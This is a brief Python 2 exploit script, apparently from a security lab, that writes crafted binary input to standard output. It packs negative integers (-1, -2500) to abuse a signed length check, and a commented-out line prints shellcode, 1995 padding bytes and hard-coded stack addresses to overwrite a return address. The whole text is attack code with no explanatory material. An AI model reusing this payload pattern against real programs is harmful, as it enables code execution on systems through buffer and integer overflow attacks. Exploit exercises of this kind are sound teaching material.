import sys
import struct

output = ""

output += struct.pack('<i', -1)

output += struct.pack('<i', -2500)

#output += struct.pack('<I', 2863311530)
sys.stdout.write(output)

#from shellcode import shellcode

#print shellcode + "\xAA"*1995 + "\xa8\xf3\xfe\xbf" + "\xbc\xfb\xfe\xbf"
